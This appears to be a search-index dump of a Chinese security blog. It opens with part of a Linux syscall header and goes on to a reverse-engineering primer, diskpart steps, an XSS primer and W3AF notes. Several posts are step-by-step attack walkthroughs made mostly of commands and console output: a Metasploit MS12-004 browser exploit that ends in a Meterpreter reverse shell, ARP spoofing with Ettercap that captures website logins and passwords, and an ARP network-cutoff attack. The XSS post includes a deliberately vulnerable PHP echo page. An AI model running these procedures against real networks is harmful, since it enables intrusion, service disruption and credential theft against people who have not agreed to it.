__NR_fchmod 91#define __NR_chown 92#define __NR_fchown 93#define __NR_lchown 94#define __NR_umask 95#define __NR_gettimeofday 96#define __NR_getrlimit 97#define __NR_getrusage 98#define __NR_sysinfo 99#define __NR_times 100#define __NR_ptrace 101#define __NR_getuid 102#define __NR_syslog 103#define __NR_getgid 104#define __NR_setuid 105#define __NR_setgid 106#define __NR_geteuid 107#define __NR_getegid 108#define __NR_setpgid 109#define __NR_getppid 110#define __NR_getpgrp 111#define __NR_setsid 112#define __NR_setreuid 113#define __NR_setregid 114#define __NR_getgroups 115#define __NR_setgroups 116#define __NR_setresuid 117#define __NR_getresuid 118#define __NR_setresgid 119#define __NR_getresgid 120#define __NR_getpgid 121#define __NR_setfsuid 122#define __NR_setfsgid 123#define __NR_getsid 124#define __NR_capget 125#define __NR_capset 126#define __NR_rt_sigpending 127#define __NR_rt_sigtimedwait 128#define __NR_rt_sigqueueinfo 129#define __NR_rt_sigsuspend 130#define __NR_sigaltstack 131#define __NR_utime 132#define __NR_mknod 133#define __NR_uselib 134#define __NR_personality 135#define __NR_ustat 136#define __NR_statfs 137#define __NR_fstatfs 138#define __NR_sysfs 139#define __NR_getpriority 140#define __NR_setpriority 141#define __NR_sched_setparam 142#define __NR_sched_getparam 143#define __NR_sched_setscheduler 144#define __NR_sched_getscheduler 145#define __NR_sched_get_priority_max 146#define __NR_sched_get_priority_min 147#define __NR_sched_rr_get_interval 148#define __NR_mlock 149#define __NR_munlock 150#define __NR_mlockall 151#define __NR_munlockall 152#define __NR_vhangup 153#define __NR_modify_ldt 154#define __NR_pivot_root 155#define __NR__sysctl 156#define __NR_prctl 157#define __NR_arch_prctl 158#define __NR_adjtimex 159#define __NR_setrlimit 160#define __NR_chroot 161#define __NR_sync 162#define __NR_acct 163#define __NR_settimeofday 164#define __NR_mount 165#define __NR_umount2 166#define __NR_swapon 167#define __NR_swapoff 168#define __NR_reboot 169#define __NR_sethostname 170#define __NR_setdomainname 171#define __NR_iopl 172#define __NR_ioperm 173#define __NR_create_module 174#define __NR_init_module 175#define __NR_delete_module 176#define __NR_get_kernel_syms 177#define __NR_query_module 178#define __NR_quotactl 179#define __NR_nfsservctl 180#define __NR_getpmsg 181#define __NR_putpmsg 182#define __NR_afs_syscall 183#define __NR_tuxcall 184#define __NR_security 185#define __NR_gettid 186#define __NR_readahead 187#define __NR_setxattr 188#define __NR_lsetxattr 189#define __NR_fsetxattr 190#define __NR_getxattr 191#define __NR_lgetxattr 192#define __NR_fgetxattr 193#define __NR_listxattr 194#define __NR_llistxattr 195#define __NR_flistxattr 196#define __NR_removexattr 197#define __NR_lremovexattr 198#define __NR_fremovexattr 199#define __NR_tkill 200#define __NR_time 201#define __NR_futex 202#define __NR_sched_setaffinity 203#define __NR_sched_getaffinity 204#define __NR_set_thread_area 205#define __NR_io_setup 206#define __NR_io_destroy 207#define __NR_io_getevents 208#define __NR_io_submit 209#define __NR_io_cancel 210#define __NR_get_thread_area 211#define __NR_lookup_dcookie 212#define __NR_epoll_create 213#define __NR_epoll_ctl_old 214#define __NR_epoll_wait_old 215#define __NR_remap_file_pages 216#define __NR_getdents64 217#define __NR_set_tid_address 218#define __NR_restart_syscall 219#define __NR_semtimedop 220#define __NR_fadvise64 221#define __NR_timer_create 222#define __NR_timer_settime 223#define __NR_timer_gettime 224#define __NR_timer_getoverrun 225#define __NR_timer_delete 226#define __NR_clock_settime 227#define __NR_clock_gettime 228#define __NR_clock_getres 229#define __NR_clock_nanosleep 230#define __NR_exit_group 231#define __NR_epoll_wait 232#define __NR_epoll_ctl 233#define __NR_tgkill 234#define __NR_utimes 235#define __NR_vserver 236#define __NR_mbind 237#define __NR_set_mempolicy 238#define __NR_get_mempolicy 239#define __NR_mq_open 240#define __NR_mq_unlink 241#define __NR_mq_timedsend 242#define __NR_mq_timedreceive 243#define __NR_mq_notify 244#define __NR_mq_getsetattr 245#define __NR_kexec_load 246#define __NR_waitid 247#define __NR_add_key 248#define __NR_request_key 249#define __NR_keyctl 250#define __NR_ioprio_set 251#define __NR_ioprio_get 252#define __NR_inotify_init 253#define __NR_inotify_add_watch 254#define __NR_inotify_rm_watch 255#define __NR_migrate_pages 256#define __NR_openat 257#define __NR_mkdirat 258#define __NR_mknodat 259#define __NR_fchownat 260#define __NR_futimesat 261#define __NR_newfstatat 262#define __NR_unlinkat 263#define __NR_renameat 264#define __NR_linkat 265#define __NR_symlinkat 266#define __NR_readlinkat 267#define __NR_fchmodat 268#define __NR_faccessat 269#define __NR_pselect6 270#define __NR_ppoll 271#define __NR_unshare 272#define __NR_set_robust_list 273#define __NR_get_robust_list 274#define __NR_splice 275#define __NR_tee 276#define __NR_sync_file_range 277#define __NR_vmsplice 278#define __NR_move_pages 279#define __NR_utimensat 280#define __NR_epoll_pwait 281#define __NR_signalfd 282#define __NR_timerfd_create 283#define __NR_eventfd 284#define __NR_fallocate 285#define __NR_timerfd_settime 286#define __NR_timerfd_gettime 287#define __NR_accept4 288#define __NR_signalfd4 289#define __NR_eventfd2 290#define __NR_epoll_create1 291#define __NR_dup3 292#define __NR_pipe2 293#define __NR_inotify_init1 294#define __NR_preadv 295#define __NR_pwritev 296#define __NR_rt_tgsigqueueinfo 297#define __NR_perf_event_open 298#define __NR_recvmmsg 299#define __NR_fanotify_init 300#define __NR_fanotify_mark 301#define __NR_prlimit64 302#define __NR_name_to_handle_at 303#define __NR_open_by_handle_at 304#define __NR_clock_adjtime 305#define __NR_syncfs 306#define __NR_sendmmsg 307#define __NR_setns 308#define __NR_getcpu 309#define __NR_process_vm_readv 310#define __NR_process_vm_writev 311#define __NR_kcmp 312#define __NR_finit_module 313#define __NR_sched_setattr 314#define __NR_sched_getattr 315#define __NR_renameat2 316#define __NR_seccomp 317#define __NR_getrandom 318#define __NR_memfd_create 319#define __NR_kexec_file_load 320#define __NR_bpf 321#define __NR_execveat 322#define __NR_userfaultfd 323#define __NR_membarrier 324#define __NR_mlock2 325#define __NR_copy_file_range 326#define __NR_preadv2 327#define __NR_pwritev2 328#endif /* _ASM_X86_UNISTD_64_H */","categories":[{"name":"PWN","slug":"pwn","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/pwn/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/PWN/"},{"name":"GDB","slug":"GDB","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/GDB/"},{"name":"peda","slug":"peda","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/peda/"},{"name":"gef","slug":"gef","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/gef/"},{"name":"pwndbg","slug":"pwndbg","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/pwndbg/"},{"name":"PWNTOOLS","slug":"PWNTOOLS","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/PWNTOOLS/"},{"name":"ASLR","slug":"ASLR","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/ASLR/"},{"name":"DEP","slug":"DEP","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/DEP/"},{"name":"堆","slug":"堆","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/堆/"},{"name":"栈","slug":"栈","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/栈/"},{"name":"objdump","slug":"objdump","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/objdump/"}]},{"title":"逆向初识","slug":"逆向初识","date":"2019-01-13T22:39:33.000Z","updated":"2019-01-13T22:40:25.310Z","comments":true,"path":"2019/01/14/逆向初识/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/逆向初识/","excerpt":"","text":"逆向的定义与核心 1.什么是逆向—–从目标代码反推源代码，从源代码理解开发者目的 ctf中与Cryto结合 Crackme(破解密码) Keygenme(生成注册码) 与隐写取证相结合 Recover(恢复文件) 与PWN结合 Reverse(interface,struct,format,protocl) Bypass auth ,Patch bin 逆向的基本流程 程序预处理，去混淆和过反调试 代码逆向，找到验证函数 验证函数逆向，找到验证算法 破解验证算法，得到flag 2.逆向的核心 破解验证算法 验证算法：1.简单比较算法2.密码算法验证3.算法求解验证 Key直接比较 Key简单变换 Key编码转换 Key散列计算 Key秘钥加密 Key算法求解 flag直接输出 秘钥空间过短 伪随机算法 3.逆向的基础 汇编，C语言 操作系统原理与核心编程、程序加载 反汇编与调试 常用工具： PE与ELF编辑、侦壳、脱壳工具(010editor、winhex、peid、upx、resource hacker、sysinternals) 反汇编与反编译工具(IDA Pro、Hopper) 调试器(Ollydbg、gdb、windbg) 动态分析：调试、模拟 静态分析：反汇编、反编译 定位验证代码 代码走查从程序主函数入口顺序追踪，适用于代码量小，主函数清晰的情况下 字符串引用搜索目标字符串，反向查找引用的地址，适用于无混淆的大部分情况 API引用搜索API指针，反向查找引用的地址，适用于显式调用API的情况 API断点在API入口下断点，断下后反向查找引用地址，适用于有输出信息的大部分情况 其他情况无明显输出信息：字符输入API处下断点从文件读入信息：文件读取API处下断点 识别验证算法 简单变换按位算术、逻辑运算，运算过程可逆运算过程代码量小，结构简单，常量简单(0,1) 密码算法按块算数运算、逻辑运算，运算过程可逆运算过程代码量大，结构复杂，常量奇怪(0x9E3779B9) 解题算法具体问题，具体分析迷宫问题，矩阵求解问题 现实竞赛简单变换+密码算法+解题算法层层识别 4.如何入门 构建逆向知识体系 逆向工程核心原理（人民邮电出版社） 加密与解密-第三版（电子工业出版社） Reverse Engineering for Beginners（http://beginners.re） 使用Ollydbg从零开始Cracking（http://bbs.pediy.com/showthread.php?t=184679） IDA Pro权威指南-第2版（人民邮电出版社） Intel汇编语言程序设计-第五版（电子工业出版社） 搭建逆向工具平台 运行环境（win,linux,mac,android,ios,x86,x64,arm……） 开发环境调试（asm,C……） 逆向环境（pediy,52pojie工具包…….） 训练平台 XCTF_OJ练习平台.(http://oj.xctf.org.cn) 实验吧决斗场.(http://www.shiyanbar.com/ctf/)难度适中 Crackme.(http://crackme.de/) 进阶篇 1.逆向的难点 绕过软件保护（过保护层） 编译器静态链接、优化 加壳、加密、混淆、花指令 反虚拟机、反调试、虚拟化 理解各种目标（语言进阶） 指令集：x86、x64、arm、arm64、mips……. 操作系统：windows、linux、ios、android…… 语言：c、pascal、haskell、c++、Go…… 编译器：vc、gcc、lcc、llvm、易语言…… 库与框架：stl、mfc、qt、boost、易语言库…… 脚本：Java、c#、perl、php、python、ruby、lua…… 脚本编译打包：pyc、pyinstaller 解决算法难题（算法进阶） 密码算法变形 矩阵求解 2.如何进阶 过保护层 .软件保护方法 反编译：程序加壳，代码混淆 反调试：调试检测 代码加壳 保护壳（压缩） 加密壳（反调试） 虚拟壳混淆（混淆） 程序反调试 检测调试状态（lsDebuggerPresent(),NtGlobalFlags()） 检测调试器（Process） 检测断点（0xCC） 检测跟踪（timecheck） 检测补丁（crc）（网上搜索“反调试总结”） 如何进阶 熟悉操作系统调试相关 熟悉常见的反调试措施 识别，见招拆招 语言进阶 语言分类 编译语言 解释语言 二进制文件 去除变量名、函数名、类型默认保留（准确性） 脚本文件 变量名、函数名、类型默认保留（代码混淆） 自己分析困难 如何进阶 识别，找工具（Google，GitHub，SourceForge） 熟悉各种语言、运行和开发环境 完整的正向过程，清晰的逆向思维 经验（VC编译代码，IDA逆向之，OD调试之，MFC，Android，C#，py2exe） 算法进阶 复杂算法 密码变种 算法竞赛 密码变种 从简单识别到理解原理和实现 算法竞赛 了解常见的数据结构，抽象程序过程 如何进阶 算法入门竞赛 找acmer帮忙 MATLAB Python库（z3，NumPy） 3.逆向其他题型 CTF逆向与隐写取证相关 逆向恢复文件 CTF逆向与PWN相关 逆向数据结构和接口 逆向协议和文件格式 Patch bin 4.逆向的地位及作用 CTF比赛人员配置 初赛 决赛 人员配置 主力逆向手 专精保护层 精通程序层 精通算法层 辅助逆向手 精通算法层(PPC,Crypto) 精通程序层(Pwn) 逆向可攻可守 PWN Patch 经常遇到的问题 坚实基础 磨合 部分基础 Hacker Cracker Acmer Developer 无基础 PHP语言 C语言应用密码学 课程小结 逆向的难点问题 软件保护 代码复杂 算法难题 如何克服这些难点 脱壳 精-&gt;通 ACM 逆向其他类型的题目 取证 PWN Patch","categories":[{"name":"CTF","slug":"ctf","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/ctf/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Reverse/"},{"name":"逆向","slug":"逆向","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/逆向/"}]},{"title":"Meatsploit之MS12_004漏洞的利用","slug":"Meatsploit之MS12-004漏洞的利用","date":"2019-01-13T22:38:01.000Z","updated":"2019-01-13T22:38:54.030Z","comments":true,"path":"2019/01/14/Meatsploit之MS12-004漏洞的利用/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Meatsploit之MS12-004漏洞的利用/","excerpt":"","text":"关于MS12_004漏洞的利用 1.打开msf控制台 root@kali:~# msfconsole ps：可能会用到这个 /etc/init.d/postgresql start（管理员权限） 2.查找漏洞利用模板 msf &gt; search 12_004 Matching Modules ================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- exploit/windows/browser/ms12_004_midi 2012-01-10 normal MS12-004 midiOutPlayNextPolyEvent Heap Overflow 3.利用漏洞 msf &gt; use exploit/windows/browser/ms12_004_midi msf变成了这样__msf exploit(ms12_004_midi) &gt; 4.查看配置信息 msf exploit(ms12_004_midi) &gt; show options Module options (exploit/windows/browser/ms12_004_midi): Name Current Setting Required Description ---- --------------- -------- ----------- OBFUSCATE false no Enable JavaScript obfuscation SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Exploit target: Id Name -- ---- 0 Automatic 5.设置SRVHOST（本机IP地址） msf exploit(ms12_004_midi) &gt; set SRVHOST 192.168.43.80 SRVHOST =&gt; 192.168.43.80 6.设置URIPATH（访问网页的名字，任意） msf exploit(ms12_004_midi) &gt; set URIPATH 1 URIPATH =&gt; 1 7.开始渗透 msf exploit(ms12_004_midi) &gt; exploit [*] Exploit running as background job. [*] Started reverse TCP handler on 192.168.43.80:4444 msf exploit(ms12_004_midi) &gt; [*] Using URL: http://192.168.43.80:8080/1 [*] Server started. 8.使被攻击者访问此URL ： http://192.168.43.80:8080/1 以下为被攻击者访问URL之后的情况 [*] 192.168.43.35 ms12_004_midi - Request as: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) [*] 192.168.43.35 ms12_004_midi - Sending html to 192.168.43.35:1090... [*] 192.168.43.35 ms12_004_midi - Request as: Windows-Media-Player/9.00.00.3250 [*] 192.168.43.35 ms12_004_midi - Sending midi corruption file... [*] 192.168.43.35 ms12_004_midi - Request as: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) [*] 192.168.43.35 ms12_004_midi - Sending html to 192.168.43.35:1094... [*] 192.168.43.35 ms12_004_midi - Request as: Windows-Media-Player/9.00.00.3250 [*] 192.168.43.35 ms12_004_midi - Sending midi corruption file... [*] 192.168.43.35 ms12_004_midi - Request as: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) [*] 192.168.43.35 ms12_004_midi - Sending midi corruption file... [*] Sending stage (957487 bytes) to 192.168.43.35 msf exploit(ms12_004_midi) &gt; [*] Meterpreter session 1 opened (192.168.43.80:4444 -&gt; 192.168.43.35:1096) at 2017-07-16 02:11:59 -0400 [*] Session ID 1 (192.168.43.80:4444 -&gt; 192.168.43.35:1096) processing InitialAutoRunScript &apos;migrate -f&apos; [*] Current server process: iexplore.exe (3612) [*] Spawning notepad.exe process to migrate to [+] Migrating to 3324 [+] Successfully migrated to process 9.设置获取的session ID msf exploit(ms12_004_midi) &gt; sessions -i 1 [*] Starting interaction with 1... 10.得到权限之后输入变成了___meterpreter &gt; meterpreter &gt; shell Process 1552 created. Channel 1 created. Microsoft Windows XP [�汾 5.1.2600] (C) ��Ȩ���� 1985-2001 Microsoft Corp. C:\\Documents and Settings\\Administrator\\����&gt; 接下来就开始你的表演吧！ 具体可以做哪些事情百度一下就全知道了","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Metasploit/"},{"name":"MS12_004","slug":"MS12-004","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/MS12-004/"}]},{"title":"Ettercap ARP欺骗用户名密码抓取","slug":"Ettercap-ARP欺骗用户名密码抓取","date":"2019-01-13T22:36:21.000Z","updated":"2019-01-13T22:37:01.218Z","comments":true,"path":"2019/01/14/Ettercap-ARP欺骗用户名密码抓取/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Ettercap-ARP欺骗用户名密码抓取/","excerpt":"","text":"如何通过 kali 获取网页登陆的用户名和密码 准备好kali与靶机 1.在终端输入 echo 1 &gt;/proc/sys/net/ipv4/ip_forward 设置网卡工作状态，保证发动arp攻击时不会导致断网，该命令无回显 2.可以用cat命令查看是否设置成功 cat /proc/sys/net/ipv4/ip_forward 1 回显为 ‘1’ 表示设置成功 3.发动arp攻击，成功后即可停止 arpspoof -i eth0 -t 192.168.43.176 192.168.43.1 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff ^CCleaning up and re-arping targets... 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 4e:49:e3:64:55:87 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 4e:49:e3:64:55:87 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 4e:49:e3:64:55:87 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 4e:49:e3:64:55:87 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 4e:49:e3:64:55:87 arpspoof -i 网卡 -t 目标IP 网关 4.使kali进入随时获取状态 ettercap -Tq -i eth0 ettercap 0.8.2 copyright 2001-2015 Ettercap Development Team Listening on: eth0 -&gt; 00:0C:29:D4:F5:FF 192.168.43.80/255.255.255.0 fe80::20c:29ff:fed4:f5ff/64 SSL dissection needs a valid &apos;redir_command_on&apos; script in the etter.conf file Ettercap might not work correctly. /proc/sys/net/ipv6/conf/eth0/use_tempaddr is not set to 0. Privileges dropped to EUID 65534 EGID 65534... 33 plugins 42 protocol dissectors 57 ports monitored 20388 mac vendor fingerprint 1766 tcp OS fingerprint 2182 known services Lua: no scripts were specified, not starting up! Randomizing 255 hosts for scanning... Scanning the whole netmask for 255 hosts... * |==================================================&gt;| 100.00 % 3 hosts added to the hosts list... Starting Unified sniffing... Text only Interface activated... Hit &apos;h&apos; for inline help ##### ettercap -Tq -i eth0 中T为启动文本模式，q为安静模式 5.使用靶机访问含有登陆界面的网页,我以7k7k小游戏为例,自动在命令行下产生如下 HTTP : 115.182.59.143:80 -&gt; USER: 星光灿烂 PASS: 123456 INFO: http://zc.7k7k.com/minilogin?callback=hdcallback_1500614556030 CONTENT: username=%E6%98%9F%E5%85%89%E7%81%BF%E7%83%82&amp;password=123456&amp;autologin=checked&amp;rf=http%3A%2F%2Fwww.7k7k.com%2F%3Fdaohangqq1%23bottom HTTP : 115.182.59.143:80 -&gt; USER: test PASS: 123456 INFO: http://zc.7k7k.com/minilogin?callback=hdcallback_1500614556030 CONTENT: username=test&amp;password=123456&amp;autologin=checked&amp;rf=http%3A%2F%2Fwww.7k7k.com%2F%3Fdaohangqq1%23bottom 以上两条本质上没有什么区别,但是当使用中文用户名的时候,产生的username=%E6%98%9F%E5%85%89%E7%81%BF%E7%83%82而不是 USER: 星光灿烂 这串代码用URL解码之后就是对应的汉字,在线解码即可","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"ARP欺骗","slug":"ARP欺骗","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/ARP欺骗/"},{"name":"arpspoof","slug":"arpspoof","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/arpspoof/"},{"name":"Ettercap","slug":"Ettercap","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Ettercap/"},{"name":"KALI","slug":"KALI","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/KALI/"}]},{"title":"ARP断网攻击","slug":"ARP断网攻击","date":"2019-01-13T22:33:22.000Z","updated":"2019-01-13T22:34:08.482Z","comments":true,"path":"2019/01/14/ARP断网攻击/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/ARP断网攻击/","excerpt":"","text":"如何在局域网内进行ARP断网攻击 主要命令 arpspoof -i 网卡 -t 目标IP 网关 网卡 查看本机的网卡&gt;&gt;ifconfig/ipconfig 目标IP fping -asg 192.168.43.0/24 （与自己的网段保持一致，例如我的IP是192.168.43.80，那我就是扫描192.168.43.0/24） 网关 查看默认网关 成功之后是这样的arpspoof -i eth0 -t 192.168.43.176 192.168.43.1 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff 0:c:29:d4:f5:ff 0:c:29:a1:54:74 0806 42: arp reply 192.168.43.1 is-at 0:c:29:d4:f5:ff","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"ARP欺骗","slug":"ARP欺骗","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/ARP欺骗/"},{"name":"arpspoof","slug":"arpspoof","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/arpspoof/"},{"name":"断网攻击","slug":"断网攻击","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/断网攻击/"}]},{"title":"CMD完成U盘分区的合并","slug":"CMD完成U盘分区的合并","date":"2019-01-13T22:25:34.000Z","updated":"2019-01-13T22:33:02.326Z","comments":true,"path":"2019/01/14/CMD完成U盘分区的合并/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/CMD完成U盘分区的合并/","excerpt":"","text":"打开一个终端 diskpart -&gt; Enter lis dis -&gt; Enter sel dis 1 -&gt; Enter clean -&gt; Enter create partition primary -&gt; Enter active -&gt; Enter format fs=fat32 quick -&gt; Enter (or format fs=ntfs quick) exit -&gt; Enter Try it!","categories":[{"name":"系统及软件配置","slug":"system-software","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/system-software/"}],"tags":[{"name":"CMD","slug":"CMD","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/CMD/"},{"name":"磁盘分区合并","slug":"磁盘分区合并","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/磁盘分区合并/"}]},{"title":"XSS的初识","slug":"XSS的初识","date":"2019-01-13T22:23:59.000Z","updated":"2019-01-13T22:24:38.126Z","comments":true,"path":"2019/01/14/XSS的初识/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/XSS的初识/","excerpt":"","text":"XSS的初识 PS：一个不成熟的版本，确实掌握具体原理时进行补充 1.认识xss跨站脚本 出现在WEB上的安全漏洞，由于WEB应用程序对输入过滤不足造成的。攻击者利用网站漏洞将恶意代码注入到网页中，当其他用户浏览这些网页时就会执行恶意代码，对受害者采取Cookie资料窃取，会话劫持，钓鱼的攻击手段 危害： 盗取用户账号 窃取用户cookie资料，冒充用户身份进入网站 劫持会话，执行任意操作 刷流量，执行弹窗广告 网页挂马 DDOS攻击 用户提权，进一步渗透网站 传播蠕虫病毒 …… 实例： 12345678910111213141516171819202122232425261.test.html&lt;html&gt;&lt;head&gt;&lt;title&gt;[2cto]test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;xss.php&quot; method=&quot;post&quot;&gt;请输入名字:&lt;br&gt;&lt;input type=&quot;test&quot; name=&quot;name&quot; value=&quot;&quot;&gt;&lt;/input&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/input&gt;&lt;/body&gt;&lt;/html&gt;2.xss.php&lt;html&gt;&lt;head&gt;&lt;title&gt;测试结果&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;?phpecho $_REQUEST[name];?&gt;&lt;/body&gt;&lt;/html&gt; 2.XSS的分类 反射型脚本 用于将恶意脚本附加到URL的地址参数中，用户点击触发 持久型脚本 攻击者将恶意JavaScript脚本上传或存储到漏洞服务器中，只要受害者浏览包含恶意代码的网页就会触发 3.XSS的构造剖析 利用&lt;&gt;标记注射HTML/Javascript 利用HTML标签属性值执行XSS 空格回车TAB 对标签属性值进行转码 产生自己的事件 利用CSS跨站剖析 4.Shellcode调用 Shellcode：最初是溢出程序和蠕虫病毒的核心，实际上是指利用一个漏洞时所执行的代码，在xss中是指由JavaScript的脚本编写的xss利用代码 Exploit：完整编写好的漏洞工具 Poc：证明漏洞存在的程序代码片段 5.XSS测试和工具剖析 FireBug 安装 动态修改HTML元素 查看网络状况 DOM查看器","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/XSS/"},{"name":"WEB","slug":"WEB","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/WEB/"}]},{"title":"Windows shellcode","slug":"Windows-shellcode","date":"2019-01-13T22:21:38.000Z","updated":"2019-01-13T22:22:57.326Z","comments":true,"path":"2019/01/14/Windows-shellcode/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Windows-shellcode/","excerpt":"","text":"Windows shellcode 我的博客 https://blog.csdn.net/aptx4869_li/article/details/80711639","categories":[{"name":"逆向","slug":"reverse","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/reverse/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Windows/"},{"name":"shellcode","slug":"shellcode","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/shellcode/"}]},{"title":"W3AF(Web Application Attack and AUdit Framework)","slug":"W3AF-Web-Application-Attack-and-AUdit-Framework","date":"2019-01-13T22:20:00.000Z","updated":"2019-01-16T14:54:39.085Z","comments":true,"path":"2019/01/14/W3AF-Web-Application-Attack-and-AUdit-Framework/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/W3AF-Web-Application-Attack-and-AUdit-Framework/","excerpt":"","text":"W3AF (Web Application Attack and AUdit Framework) 这个书out了，看这个：https://bbs.ichunqiu.com/thread-15297-1-1.html http://www.freebuf.com/articles/5472.htmlroot@kali:~# cd /usr/share/w3afroot@kali:/usr/share/w3af# ./w3af_consolew3af&gt;&gt;&gt; root@bt:/pentest/web/w3af# ./w3af_consoleChecking if a new version is available in our SVN repository. Please wait...An error occured while updating: &apos;NoneType&apos; object is not iterablew3af&gt;&gt;&gt; pluginsw3af/plugins&gt;&gt;&gt; list discovery|---------------------------------------------------------------------------|| Plugin name | Status | Conf | Description ||---------------------------------------------------------------------------|| afd | | | Find out if the remote web || | | | server has an active filter ( || | | | IPS or WAF ). || allowedMethods | | Yes | Enumerate the 